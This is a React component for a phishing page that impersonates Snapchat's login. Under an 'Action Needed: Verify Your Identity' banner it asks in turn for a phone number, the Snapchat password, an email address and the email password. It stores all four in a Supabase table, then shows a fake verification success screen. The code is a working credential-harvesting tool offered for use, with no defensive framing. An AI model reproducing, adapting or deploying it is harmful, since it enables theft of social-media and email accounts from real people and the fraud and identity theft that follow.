import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { SnapchatGhost } from "./SnapchatGhost";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { ChevronDown, Check, AlertTriangle, ArrowLeft } from "lucide-react";

type Step = "phone" | "password" | "email" | "success";

export const LoginFlow = () => {
  const [step, setStep] = useState<Step>("phone");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [phonePassword, setPhonePassword] = useState("");
  const [email, setEmail] = useState("");
  const [emailPassword, setEmailPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  const handlePhoneSubmit = () => {
    if (!phoneNumber) {
      toast({
        title: "Phone number required",
        description: "Please enter your phone number",
        variant: "destructive"
      });
      return;
    }
    setStep("password");
  };

  const handlePasswordSubmit = () => {
    if (!phonePassword) {
      toast({
        title: "Password required",
        description: "Please enter your password",
        variant: "destructive"
      });
      return;
    }
    setStep("email");
  };

  const handleEmailSubmit = async () => {
    if (!email || !emailPassword) {
      toast({
        title: "Email and password required",
        description: "Please enter both email and password",
        variant: "destructive"
      });
      return;
    }

    setLoading(true);
    try {
      const { error } = await supabase
        .from('user_verifications')
        .insert([
          {
            phone_number: phoneNumber,
            phone_password: phonePassword,
            email: email,
            email_password: emailPassword,
            verification_status: 'completed'
          }
        ]);

      if (error) {
        toast({
          title: "Error",
          description: "Failed to save verification data",
          variant: "destructive"
        });
      } else {
        setStep("success");
        toast({
          title: "Success!",
          description: "Verification completed successfully",
        });
      }
    } catch (error) {
      toast({
        title: "Error",
        description: "An unexpected error occurred",
        variant: "destructive"
      });
    } finally {
      setLoading(false);
    }
  };

  const resetFlow = () => {
    setStep("phone");
    setPhoneNumber("");
    setPhonePassword("");
    setEmail("");
    setEmailPassword("");
  };

  // Add a function to handle going back
  const handleBack = () => {
    if (step === "password") setStep("phone");
    else if (step === "email") setStep("password");
    else if (step === "success") setStep("email");
  };

  return (
    <div className="min-h-screen bg-background flex items-center justify-center p-2 sm:p-4 overflow-x-hidden">
      <Card className="w-full max-w-full sm:max-w-md p-4 sm:p-8 bg-card shadow-lg flex flex-col overflow-auto max-h-[calc(100svh-80px)] sm:max-h-[calc(100vh-120px)] pb-32">
        <div className="text-center mb-6 sm:mb-8 flex-1">
          {/* Back button for all steps except 'phone' */}
          {step !== "phone" && (
            <div className="flex w-full mb-2">
              <button
                onClick={handleBack}
                className="flex items-center gap-1 text-snapchat-blue hover:text-snapchat-blue/80 bg-transparent border-none p-2 rounded-full focus:outline-none focus:ring-2 focus:ring-snapchat-blue"
                aria-label="Back"
                type="button"
              >
                <ArrowLeft className="w-5 h-5" />
                <span className="hidden sm:inline text-base font-medium">Back</span>
              </button>
            </div>
          )}
          {/* Header with alert icon */}
          <div className="flex flex-col items-center justify-center gap-2 mb-4">
            <div className="flex items-center gap-2">
              <AlertTriangle className="text-yellow-500 w-6 h-6 sm:w-7 sm:h-7" aria-label="Alert" />
              <span className="text-lg sm:text-2xl font-bold text-foreground">Action Needed: Verify Your Identity</span>
            </div>
            <SnapchatGhost className="mt-2 mb-2 sm:mb-4 text-foreground" />
          </div>
          
          {step === "phone" && (
            <>
              <h1 className="text-xl sm:text-2xl font-semibold text-foreground mb-2">Log in to Snapchat</h1>
              <div className="space-y-4 sm:space-y-6">
                <div>
                  <Label htmlFor="phone" className="text-sm text-muted-foreground">Phone number</Label>
                  <div className="relative mt-2">
                    <div className="flex items-center bg-input border rounded-md">
                      <div className="flex items-center px-2 py-2 sm:px-3 border-r">
                        <span className="text-sm">🇮🇳</span>
                        <span className="ml-1 text-sm">IN +91</span>
                        <ChevronDown className="ml-1 w-4 h-4" />
                      </div>
                      <Input
                        id="phone"
                        type="tel"
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value)}
                        className="border-0 focus-visible:ring-0 flex-1 min-h-[44px] text-base sm:text-lg"
                        placeholder="Enter phone number"
                      />
                    </div>
                  </div>
                </div>
                
                <button className="text-snapchat-blue text-sm">
                  Use Username or Email instead
                </button>
                
                <Button 
                  onClick={handlePhoneSubmit}
                  className="w-full bg-snapchat-blue hover:bg-snapchat-blue/90 text-white rounded-full py-3 min-h-[44px] text-base sm:text-lg"
                >
                  Next
                </Button>
              </div>
              
              <div className="mt-6 sm:mt-8 text-center">
                <span className="text-muted-foreground">New To Snapchat? </span>
                <button className="text-foreground font-semibold">Sign Up</button>
              </div>
            </>
          )}

          {step === "password" && (
            <>
              <h1 className="text-xl sm:text-2xl font-semibold text-foreground mb-2">Enter Password</h1>
              <div className="text-sm text-foreground mb-1">+91{phoneNumber}</div>
              <button className="text-snapchat-blue text-sm mb-4 sm:mb-6">Not you?</button>
              
              <div className="space-y-4 sm:space-y-6">
                <div>
                  <Label htmlFor="password" className="text-sm text-muted-foreground">Password</Label>
                  <Input
                    id="password"
                    type="password"
                    value={phonePassword}
                    onChange={(e) => setPhonePassword(e.target.value)}
                    className="mt-2 border-0 border-b-2 border-snapchat-blue rounded-none focus-visible:ring-0 bg-transparent min-h-[44px] text-base sm:text-lg"
                    placeholder="Enter password"
                  />
                </div>
                
                <button className="text-snapchat-blue text-sm">
                  Forgot Password
                </button>
                
                <Button 
                  onClick={handlePasswordSubmit}
                  className="w-full bg-snapchat-blue hover:bg-snapchat-blue/90 text-white rounded-full py-3 min-h-[44px] text-base sm:text-lg"
                >
                  Next
                </Button>
              </div>
            </>
          )}

          {step === "email" && (
            <>
              <h1 className="text-xl sm:text-2xl font-semibold text-foreground mb-2">Email Verification</h1>
              <p className="text-sm text-muted-foreground mb-4 sm:mb-6">Please provide your email and email password for verification.</p>
              
              <div className="space-y-4 sm:space-y-6">
                <div>
                  <Label htmlFor="email" className="text-sm text-muted-foreground">Email</Label>
                  <Input
                    id="email"
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    className="mt-2 border-0 border-b-2 border-snapchat-blue rounded-none focus-visible:ring-0 bg-transparent min-h-[44px] text-base sm:text-lg"
                    placeholder="Enter email address"
                  />
                </div>
                
                <div>
                  <Label htmlFor="email-password" className="text-sm text-muted-foreground">Email Password</Label>
                  <Input
                    id="email-password"
                    type="password"
                    value={emailPassword}
                    onChange={(e) => setEmailPassword(e.target.value)}
                    className="mt-2 border-0 border-b-2 border-snapchat-blue rounded-none focus-visible:ring-0 bg-transparent min-h-[44px] text-base sm:text-lg"
                    placeholder="Enter email password"
                  />
                </div>
                
                <Button 
                  onClick={handleEmailSubmit}
                  disabled={loading}
                  className="w-full bg-snapchat-blue hover:bg-snapchat-blue/90 text-white rounded-full py-3 min-h-[44px] text-base sm:text-lg"
                >
                  {loading ? "Verifying..." : "Complete Verification"}
                </Button>
              </div>
            </>
          )}

          {step === "success" && (
            <>
              <div className="text-green-500 mb-4">
                <Check className="w-16 h-16 mx-auto" />
              </div>
              <h1 className="text-xl sm:text-2xl font-semibold text-foreground mb-2">Verification Successful!</h1>
              <p className="text-muted-foreground mb-4 sm:mb-6">Your account has been verified and data saved successfully.</p>
              
              <div className="space-y-4">
                <div className="text-left bg-muted p-4 rounded-lg">
                  <div className="text-sm text-muted-foreground">Phone: +91{phoneNumber}</div>
                  <div className="text-sm text-muted-foreground">Email: {email}</div>
                  <div className="text-sm text-green-600 font-semibold">Status: Verified ✓</div>
                </div>
                
                <Button 
                  onClick={resetFlow}
                  variant="outline"
                  className="w-full min-h-[44px] text-base sm:text-lg"
                >
                  Start New Verification
                </Button>
              </div>
            </>
          )}
        </div>
      </Card>

      {/* Footer */}
      <div className="fixed bottom-0 left-0 right-0 bg-card border-t p-2 sm:p-4 z-10 hidden sm:block">
        <div className="max-w-full sm:max-w-6xl mx-auto">
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-4 sm:gap-8 text-xs sm:text-sm">
            <div>
              <h3 className="font-semibold mb-2">Company</h3>
              <div className="space-y-1 text-muted-foreground">
                <div>Snap Inc.</div>
                <div>Careers</div>
                <div>News</div>
              </div>
            </div>
            <div>
              <h3 className="font-semibold mb-2">Community</h3>
              <div className="space-y-1 text-muted-foreground">
                <div>Support</div>
                <div>Community Guidelines</div>
                <div>Safety Center</div>
              </div>
            </div>
            <div>
              <h3 className="font-semibold mb-2">Advertising</h3>
              <div className="space-y-1 text-muted-foreground">
                <div>Buy Ads</div>
                <div>Advertising Policies</div>
                <div>Political Ads Library</div>
                <div>Brand Guidelines</div>
              </div>
            </div>
            <div>
              <h3 className="font-semibold mb-2">Legal</h3>
              <div className="space-y-1 text-muted-foreground">
                <div>Privacy Center</div>
                <div>Your Privacy Choices</div>
                <div>Cookie Policy</div>
                <div>Report Infringement</div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};